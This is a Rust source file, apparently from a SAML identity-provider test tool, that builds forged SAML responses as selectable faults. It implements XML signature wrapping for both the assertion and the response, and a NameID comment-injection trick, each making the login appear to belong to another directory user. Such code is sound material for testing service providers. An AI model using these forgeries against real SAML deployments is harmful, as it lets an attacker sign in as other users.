use super::*;
use crate::{
    model::{Directory, User},
    oidc::Faults,
};
use bergshamra::xml::{
    Document, NodeId,
    uppsala::{self, QName},
};

pub(super) const FORGED_SUFFIX: &str = ".scimtest-forged.example";

pub(super) fn forgery_user<'a>(
    directory: &'a Directory,
    signed_in: &User,
) -> Result<&'a User, Error> {
    directory.users.iter().filter(|candidate| {
        candidate.id != signed_in.id && candidate.fields.active && !candidate.deleted
            && !directory.user_sync.get(&candidate.id).is_some_and(|state| state.deleted)
            && !name_id(&directory.environment, candidate).trim().is_empty()
            && name_id(&directory.environment, candidate) != name_id(&directory.environment, signed_in)
    }).min_by_key(|candidate| &candidate.id).ok_or_else(|| Error::Validation(
        "this fault needs another active directory user with a different, non-empty SAML NameID".into()
    ))
}

pub(super) fn apply(
    xml: String,
    directory: &Directory,
    user: &User,
    faults: &Faults,
) -> Result<String, Error> {
    if !["xsw_assertion", "xsw_response", "nameid_comment"]
        .iter()
        .any(|fault| faults.tampers(fault))
    {
        return Ok(xml);
    }
    let mut document = uppsala::parse(&xml).map_err(crypto_error)?;
    let root = document
        .document_element()
        .ok_or_else(|| Error::Validation("SAML root is required".into()))?;
    if faults.tampers("nameid_comment") {
        let name = crypto::descendants(&document, root, ASSERTION_NS, "NameID")
            .first()
            .copied()
            .ok_or_else(|| Error::Validation("nameid_comment fault found no NameID".into()))?;
        let joined = document.text_content_deep(name);
        let victim = joined.strip_suffix(FORGED_SUFFIX).ok_or_else(|| {
            Error::Validation("nameid_comment fault lost its forged NameID".into())
        })?;
        set_text(&mut document, name, victim);
        let comment = document.create_comment("");
        document.append_child(name, comment);
        let suffix = document.create_text(FORGED_SUFFIX);
        document.append_child(name, suffix);
    }
    if !faults.tampers("xsw_assertion") && !faults.tampers("xsw_response") {
        return Ok(document.to_xml());
    }
    let victim = forgery_user(directory, user)?;
    let source_xml = document.to_xml();
    let source = uppsala::parse(&source_xml).map_err(crypto_error)?;
    let source_root = source
        .document_element()
        .ok_or_else(|| Error::Validation("SAML root is required".into()))?;
    if faults.tampers("xsw_response") {
        if crypto::child(&document, root, DSIG_NS, "Signature").is_none() {
            return Err(Error::Validation(
                "xsw_response fault needs a signed response; sign the response or both".into(),
            ));
        }
        let forged = forge(
            &mut document,
            &source,
            source_root,
            directory,
            victim,
            "saml-forged-response",
        )?;
        if let Some(assertion) = crypto::descendants(&document, forged, ASSERTION_NS, "Assertion")
            .first()
            .copied()
        {
            reassign_id(&mut document, assertion, "saml-forged-assertion");
        }
        document.replace_child(document.root(), forged, root);
        document.append_child(forged, root);
    } else {
        let assertion = crypto::child(&document, root, ASSERTION_NS, "Assertion")
            .filter(|node| crypto::child(&document, *node, DSIG_NS, "Signature").is_some())
            .ok_or_else(|| {
                Error::Validation(
                    "xsw_assertion fault needs a signed assertion; sign only the assertion".into(),
                )
            })?;
        if crypto::child(&document, root, DSIG_NS, "Signature").is_some() {
            return Err(Error::Validation(
                "xsw_assertion fault cannot wrap a signed response; sign only the assertion".into(),
            ));
        }
        let source_assertion = crypto::child(&source, source_root, ASSERTION_NS, "Assertion")
            .ok_or_else(|| Error::Validation("SAML assertion is required".into()))?;
        let forged = forge(
            &mut document,
            &source,
            source_assertion,
            directory,
            victim,
            "saml-forged-assertion",
        )?;
        document.insert_before(root, forged, assertion);
    }
    Ok(document.to_xml())
}
fn forge(
    document: &mut Document<'_>,
    source: &Document<'_>,
    node: NodeId,
    directory: &Directory,
    victim: &User,
    prefix: &str,
) -> Result<NodeId, Error> {
    let forged = document
        .import_subtree(source, node)
        .ok_or_else(|| Error::Validation("cannot copy SAML element".into()))?;
    if let Some(signature) = crypto::child(document, forged, DSIG_NS, "Signature") {
        document.remove_child(forged, signature);
    }
    if let Some(name) = crypto::descendants(document, forged, ASSERTION_NS, "NameID")
        .first()
        .copied()
    {
        set_text(document, name, name_id(&directory.environment, victim));
    }
    reassign_id(document, forged, prefix);
    Ok(forged)
}
fn reassign_id(document: &mut Document<'_>, node: NodeId, prefix: &str) {
    if let Some(element) = document.element_mut(node) {
        element.set_attribute(QName::local("ID"), crate::store::new_id(prefix).into());
    }
}
fn set_text(document: &mut Document<'_>, node: NodeId, text: &str) {
    for child in document.children(node) {
        document.remove_child(node, child);
    }
    let text = document.create_text(text.to_owned());
    document.append_child(node, text);
}
